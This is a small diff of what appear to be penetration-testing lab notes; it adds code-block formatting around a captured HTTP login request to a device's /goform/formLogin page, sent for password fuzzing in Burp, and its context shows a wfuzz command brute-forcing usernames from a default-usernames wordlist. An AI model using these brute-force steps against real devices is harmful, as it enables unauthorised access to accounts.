@@ -30,7 +30,7 @@ wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 4
 
 Fuzz the password in Burp
 
-
+```
 POST /goform/formLogin HTTP/1.1
 Host: 192.168.233.45
 Content-Length: 64
@@ -46,6 +46,8 @@ Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
 
 HtmlOnly=true&Login=admin&Password=dawg&loginButton=Submit+Login
+
+```
 
 
 RUn this command
